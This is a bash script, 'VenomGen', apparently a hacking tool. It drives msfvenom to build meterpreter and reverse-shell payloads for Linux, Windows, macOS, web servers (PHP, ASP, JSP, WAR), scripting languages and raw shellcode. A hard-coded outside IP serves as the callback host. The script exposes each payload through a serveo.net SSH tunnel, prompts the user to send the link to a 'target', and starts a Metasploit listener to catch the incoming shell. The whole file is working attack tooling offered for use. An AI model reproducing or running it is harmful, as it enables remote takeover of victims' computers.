#!/bin/bash
# VenomGen v1.1: Payload Generator and WAN Listener 
# Coded by: @AnonyminHack5
# Github: https://github.com/TermuxHackz

trap 'printf "\n";stop' 2

banner() {



echo "                                                                                                                         ";
echo "                                                                                                                 dddddddd";
echo "                                                           lllllll                                               d::::::d";
echo "                                                           l:::::l                                               d::::::d";
echo "                                                           l:::::l                                               d::::::d";
echo "                                                           l:::::l                                               d:::::d ";
echo "ppppp   ppppppppp     aaaaaaaaaaaaayyyyyyy           yyyyyyyl::::l    ooooooooooo     aaaaaaaaaaaaa      ddddddddd:::::d ";
echo "p::::ppp:::::::::p    a::::::::::::ay:::::y         y:::::y l::::l  oo:::::::::::oo   a::::::::::::a   dd::::::::::::::d ";
echo "p:::::::::::::::::p   aaaaaaaaa:::::ay:::::y       y:::::y  l::::l o:::::::::::::::o  aaaaaaaaa:::::a d::::::::::::::::d ";
echo "pp::::::ppppp::::::p           a::::a y:::::y     y:::::y   l::::l o:::::ooooo:::::o           a::::ad:::::::ddddd:::::d ";
echo " p:::::p     p:::::p    aaaaaaa:::::a  y:::::y   y:::::y    l::::l o::::o     o::::o    aaaaaaa:::::ad::::::d    d:::::d ";
echo " p:::::p     p:::::p  aa::::::::::::a   y:::::y y:::::y     l::::l o::::o     o::::o  aa::::::::::::ad:::::d     d:::::d ";
echo " p:::::p     p:::::p a::::aaaa::::::a    y:::::y:::::y      l::::l o::::o     o::::o a::::aaaa::::::ad:::::d     d:::::d ";
echo " p:::::p    p::::::pa::::a    a:::::a     y:::::::::y       l::::l o::::o     o::::oa::::a    a:::::ad:::::d     d:::::d ";
echo " p:::::ppppp:::::::pa::::a    a:::::a      y:::::::y       l::::::lo:::::ooooo:::::oa::::a    a:::::ad::::::ddddd::::::dd";
echo " p::::::::::::::::p a:::::aaaa::::::a       y:::::y        l::::::lo:::::::::::::::oa:::::aaaa::::::a d:::::::::::::::::d";
echo " p::::::::::::::pp   a::::::::::aa:::a     y:::::y         l::::::l oo:::::::::::oo  a::::::::::aa:::a d:::::::::ddd::::d";
echo " p::::::pppppppp      aaaaaaaaaa  aaaa    y:::::y          llllllll   ooooooooooo     aaaaaaaaaa  aaaa  ddddddddd   ddddd";
echo " p:::::p                                 y:::::y                                                                         ";
echo " p:::::p                                y:::::y                          Coded By AnonyminHack5                                 ";
echo "p:::::::p                              y:::::y                                                                           ";
echo "p:::::::p                             y:::::y                     https://www.youtube.com/nil                      ";
echo "p:::::::p                            yyyyyyy                                                                             ";
echo "ppppppppp                                                                                                                ";
echo "                                                                                                                         ";


}

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

if [[ -e handler.rc ]]; then
rm -rf handler.rc
fi
}

lhost="159.89.214.31"
format=""


dependencies() {

command -v msfconsole > /dev/null 2>&1 || { echo >&2 "I require Metasploit but it's not installed. Install it. Aborting."; exit 1; }
command -v msfvenom > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }


}
server() {
chmod +x $payload_name*
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net -R $default_port3:localhost:$lport 2> /dev/null &
sleep 3
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the first link to target + /%s%s:\e[0m\e[1;77m \n' $payload_name $format
php -S localhost:$port > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Starting MSF Listener...\e[0m\n'
printf "\n"
#nc -lvp $default_port2

}

listener() {
default_listr="Y"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Start Server and MSF Listener?\e[0m\e[1;77m [Y/n]: ' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
printf "use exploit/multi/handler\n" > handler.rc
printf "set payload %s\n" $payload >> handler.rc
printf "set LHOST 127.0.0.1\n" >> handler.rc
printf "set LPORT %s\n" $lport >> handler.rc
printf "set ExitOnSession false\n" >> handler.rc
printf "exploit -j -z\n" >> handler.rc
server
msfconsole -r handler.rc
rm -rf handler.rc
fi
}


start() {
default_port=$(seq 1111 4444 | sort -R | head -n1)
default_lport=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
lport="${lport:-${default_lport}}"
port="${port:-${default_port}}"
default_payload_name="payload"
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"



}

binaries_linux() {
format=".elf"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f elf > $payload_name.elf

}

binaries_windows() {
format=".exe"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f exe > $payload_name.exe


}

binaries_mac() {
format=".macho"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f macho > $payload_name.macho


}


binaries() {
clear
banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Binaries Payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] Linux\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Windows\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] MAC\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose a option:\e[0m\e[1;77m ' option_bin

if [[ $option_bin == 1 ]]; then
start
payload="linux/x86/meterpreter/reverse_tcp"
binaries_linux
listener

elif [[ $option_bin == 2 ]]; then
start
payload="windows/meterpreter/reverse_tcp"
binaries_windows
listener
elif [[ $option_bin == 3 ]]; then
start
payload="osx/x86/shell_reverse_tcp/"
binaries_mac
listener
elif [[ $option_bin == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
binaries
fi
}

php_payload() {
format=".php"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.php

}

asp_payload() {
format=".asp"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.asp
}

jsp_payload() {
format=".jsp"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.jsp

}
war_payload() {
format=".war"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f war > $payload_name.war

}

python_payload(){
format=".sh"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format

}

bash_payload() {
format=".sh"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format

}

perl_payload() {
format=".sh"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
}

webpayloads() {
clear
banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Web Payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] PHP\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] ASP\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] JSP\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m4\e[0m\e[1;93m] WAR\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose a option:\e[0m\e[1;77m ' option_web

if [[ $option_web == 1 ]]; then
payload="php/meterpreter_reverse_tcp"
start
php_payload
listener
elif [[ $option_web == 2 ]]; then
payload="windows/meterpreter/reverse_tcp"
start
asp_payload
listener
elif [[ $option_web == 3 ]]; then
payload="java/jsp_shell_reverse_tcp"
start
jsp_payload
listener
elif [[ $option_web == 4 ]]; then
payload="java/jsp_shell_reverse_tcp"
start
war_payload
listener
elif [[ $option_web == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
webpayloads
fi


}


scripting() {
clear
banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Shell Scripting Payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] Python\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Bash\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] Perl\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose a option:\e[0m\e[1;77m ' option_script

if [[ $option_script == 1 ]]; then
payload="cmd/unix/reverse_python"
start
python_payload
listener
elif [[ $option_script == 2 ]]; then
payload="cmd/unix/reverse_bash"
start
bash_payload
listener
elif [[ $option_script == 3 ]]; then
payload="cmd/unix/reverse_perl"
start
perl_payload
listener
elif [[ $option_script == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
scripting
fi

}

shellcode_based() {
clear
banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Language:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] C\e[0m       \e[1;93m[\e[0m\e[1;77m12\e[0m\e[1;93m] pl\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Bash\e[0m    \e[1;93m[\e[0m\e[1;77m13\e[0m\e[1;93m] powershell\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] CSharp\e[0m  \e[1;93m[\e[0m\e[1;77m14\e[0m\e[1;93m] ps1\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m4\e[0m\e[1;93m] dw\e[0m      \e[1;93m[\e[0m\e[1;77m15\e[0m\e[1;93m] py\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m5\e[0m\e[1;93m] dword\e[0m   \e[1;93m[\e[0m\e[1;77m16\e[0m\e[1;93m] python\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m6\e[0m\e[1;93m] hex\e[0m     \e[1;93m[\e[0m\e[1;77m17\e[0m\e[1;93m] raw\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m7\e[0m\e[1;93m] java\e[0m    \e[1;93m[\e[0m\e[1;77m18\e[0m\e[1;93m] rb\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m8\e[0m\e[1;93m] js_be\e[0m   \e[1;93m[\e[0m\e[1;77m19\e[0m\e[1;93m] ruby\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m9\e[0m\e[1;93m] js_le\e[0m   \e[1;93m[\e[0m\e[1;77m20\e[0m\e[1;93m] sh\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m10\e[0m\e[1;93m] num\e[0m    \e[1;93m[\e[0m\e[1;77m21\e[0m\e[1;93m] vbapplication\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m11\e[0m\e[1;93m] perl\e[0m   \e[1;93m[\e[0m\e[1;77m22\e[0m\e[1;93m] vbscript\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose a option:\e[0m\e[1;77m ' option_lang

if [[ $option_lang == 1 ]]; then
lang="c"
elif [[ $option_lang == 2 ]]; then
lang="bash"
elif [[ $option_lang == 3 ]]; then
lang="csharp"
elif [[ $option_lang == 4 ]]; then
lang="dw"
elif [[ $option_lang == 5 ]]; then
lang="dword"

elif [[ $option_lang == 6 ]]; then
lang="hex"
elif [[ $option_lang == 7 ]]; then
lang="java"

elif [[ $option_lang == 8 ]]; then
lang="js_be"

elif [[ $option_lang == 9 ]]; then
lang="js_le"

elif [[ $option_lang == 10 ]]; then
lang="num"

elif [[ $option_lang == 11 ]]; then
lang="perl"

elif [[ $option_lang == 12 ]]; then
lang="pl"
echo n
elif [[ $option_lang == 13 ]]; then
lang="powershell"

elif [[ $option_lang == 14 ]]; then
lang="ps1"

elif [[ $option_lang == 15 ]]; then
lang="py"
elif [[ $option_lang == 16 ]]; then
lang="python"
elif [[ $option_lang == 17 ]]; then
lang="raw"
elif [[ $option_lang == 18 ]]; then
lang="rb"
elif [[ $option_lang == 19 ]]; then
lang="ruby"
elif [[ $option_lang == 20 ]]; then
lang="sh"
elif [[ $option_lang == 21 ]]; then
lang="vbapplication"
elif [[ $option_lang == 22 ]]; then
lang="vbscript"
elif [[ $option_lang == 99 ]]; then
shellcode
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
shellcode_based
fi



msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f $lang > $payload_name
listener
}

shellcode() {
clear
banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Shellcode based payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] Linux\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Windows\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] MAC\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose a option:\e[0m\e[1;77m ' option_shell

if [[ $option_shell == 1 ]]; then
payload="linux/x86/meterpreter/reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 2 ]]; then
payload="windows/meterpreter/reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 3 ]]; then
payload="osx/x86/shell_reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
shellcode
fi

}




function  menu() {
clear
banner
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] Binaries Payloads\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Web Payloads\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] Scripting Payloads\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m4\e[0m\e[1;93m] Shellcode\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose a option:\e[0m\e[1;77m ' option

if [[ $option == 1 ]]; then
clear
binaries
elif [[ $option == 2 ]]; then
webpayloads
elif [[ $option == 3 ]]; then
scripting
elif [[ $option == 4 ]]; then
shellcode
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
fi
}
dependencies
menu
